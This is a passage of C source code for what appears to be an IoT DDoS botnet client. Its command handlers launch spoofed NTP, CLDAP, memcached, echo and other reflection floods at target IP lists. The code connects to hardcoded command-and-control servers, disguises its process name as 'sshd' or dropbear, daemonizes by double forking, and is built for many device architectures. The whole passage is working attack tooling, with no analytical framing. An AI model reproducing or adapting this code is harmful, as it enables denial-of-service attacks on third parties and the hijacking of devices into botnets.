            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ripattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ripattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "ECHO")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        echoattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                echoattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "XTD")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "LDAP")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
    if(!strcmp(argv[0], "SDP")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "GAME")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        echoattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                echoattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    }
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "MEM")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "STOP")){
            int killed = 0;
            unsigned long i;
            for (i = 0; i < numpids; i++){
                if (pids[i] != 0 && pids[i] != getpid()) {
                    kill(pids[i], 9);
                    killed++;
                }
            }
        }
    
}


int initConnection(){
    unsigned char server[4096];
    memset(server, 0, 4096);
    if(KHcommSOCK) { close(KHcommSOCK); KHcommSOCK = 0; }
    if(KHserverHACKER + 1 == srv_lst_sz) KHserverHACKER = 0;
    else KHserverHACKER++;
    szprintf(server, "%d.%d.%d.%d", ip1[KHserverHACKER],ip2[KHserverHACKER],ip3[KHserverHACKER],ip4[KHserverHACKER]);
    int port = bot_PORT;
    if(strchr(server, ':') != NULL){
        port = atoi(strchr(server, ':') + 1);
        *((unsigned char *)(strchr(server, ':'))) = 0x0;
    }

    KHcommSOCK = socket(AF_INET, SOCK_STREAM, 0);

    if(!connectTimeout(KHcommSOCK, server, port, 30)) return 1;

    return 0;
}
int getOurIP(){
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;

    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL){
        if(strstr(linebuf, "\t00000000\t") != NULL){
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf){
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }
    close(sock);
}

char *getBuild(){
// ARCH
#ifdef DEBUG
#define BOT_BUILD "debug"
#elif MIPS_BUILD || MIPS
#define BOT_BUILD "mips"
#elif MIPSEL_BUILD || MPSL_BUILD || MPSL || MIPSEL
#define BOT_BUILD "mipsel"
#elif SPARC_BUILD || SPARC
#define BOT_BUILD "sparc"
#elif SH4_BUILD || SH4
#define BOT_BUILD "sh4"
#elif X86_BUILD || X86_64_BUILD || X86_32_BUILD || X86 || X86_64 || X86_32
#define BOT_BUILD "x86"
#elif ARMV4_BUILD || ARM_BUILD || ARMV4L_BUILD || ARM4 || ARM
#define BOT_BUILD "armv4"
#elif ARMV5_BUILD || ARMV5L_BUILD || ARM5
#define BOT_BUILD "armv5"
#elif ARMV6_BUILD || ARMV6L_BUILD || ARM6
#define BOT_BUILD "armv6"
#elif ARMV7_BUILD || ARMV7L_BUILD || ARM7
#define BOT_BUILD "armv7"
#elif PPC_BUILD || POWERPC_BUILD || PPC || POWERPC
#define BOT_BUILD "powerpc"
#elif M68K_BUILD || M68K || M68K
#define BOT_BUILD "m68k"
#elif SRV_BUILD || SRV
#define BOT_BUILD "servers"
#else
#define BOT_BUILD "unknown"
#endif
}

int main(int argc, unsigned char *argv[]){
    char *mynameis = "";
    if(access("/usr/bin/python", F_OK) != -1){
        mynameis = "sshd";
    } else {
        mynameis = "/usr/sbin/dropbear";
    }
    if(geteuid() == 0){
        userID = 0;
    }
        
    if(srv_lst_sz <= 0) return 0;
    strncpy(argv[0],"",strlen(argv[0]));
    sprintf(argv[0], mynameis);
    prctl(pr_name, (unsigned long) mynameis, 0, 0, 0);
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    pid_t pid1;
    pid_t pid2;
    int status;
    getOurIP();
    table_init();
    char *tbl_exec_succ;
    int tbl_exec_succ_len = 0;
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);
    watchdog_maintain();

    if (pid1 = fork()){
        waitpid(pid1, &status, 0);
        exit(0);
    }
    else if (!pid1) {
        if (pid2 = fork()){
            exit(0);
        }
        else if(!pid2){
        }
        else{
        }
    }
    else{
    } 
    #ifndef DEBUG
    signal(SIGPIPE, SIG_IGN);
    #endif
    while(1){
        if(initConnection()) { sleep(5); continue; }
        getBuild();
        sockprintf(KHcommSOCK, "arch %s", BOT_BUILD);
        char commBuf[4096];
        int got = 0;
        int i = 0;
        while((got = recvLine(KHcommSOCK, commBuf, 4096)) != -1){
            for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
            unsigned int *newpids, on;
            for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
            pids[on - 1] = 0;
            numpids--;
            newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
            for (on = 0; on < numpids; on++) newpids[on] = pids[on];
            free(pids);
            pids = newpids;
        }
        commBuf[got] = 0x00;
        trim(commBuf);
        unsigned char *m3ss4ge = commBuf;

        if(*m3ss4ge == '.'){
            unsigned char *nickMask = m3ss4ge + 1;
            while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
            if(*nickMask == 0x00) continue;
            *(nickMask) = 0x00;
            nickMask = m3ss4ge + 1;
            m3ss4ge = m3ss4ge + strlen(nickMask) + 2;
            while(m3ss4ge[strlen(m3ss4ge) - 1] == '\n' || m3ss4ge[strlen(m3ss4ge) - 1] == '\r') m3ss4ge[strlen(m3ss4ge) - 1] = 0x00;
            unsigned char *command = m3ss4ge;
            while(*m3ss4ge != ' ' && *m3ss4ge != 0x00) m3ss4ge++;
            *m3ss4ge = 0x00;
            m3ss4ge++;
            unsigned char *tCpc0mm4nd = command;
            while(*tCpc0mm4nd) { *tCpc0mm4nd = toupper(*tCpc0mm4nd); tCpc0mm4nd++; }
            unsigned char *params[10];
            int paramsCount = 1;
            unsigned char *pch = strtok(m3ss4ge, " ");
            params[0] = command;
            while(pch){
                if(*pch != '\n'){
                    params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                    memset(params[paramsCount], 0, strlen(pch) + 1);
                    strcpy(params[paramsCount], pch);
                    paramsCount++;
                }
                pch = strtok(NULL, " ");
            }
            processCmd(paramsCount, params);

            if(paramsCount > 1){
                int q = 1;
                for(q = 1; q < paramsCount; q++){
                    free(params[q]);
                }
            }
        }
    }        
}
return 0;
}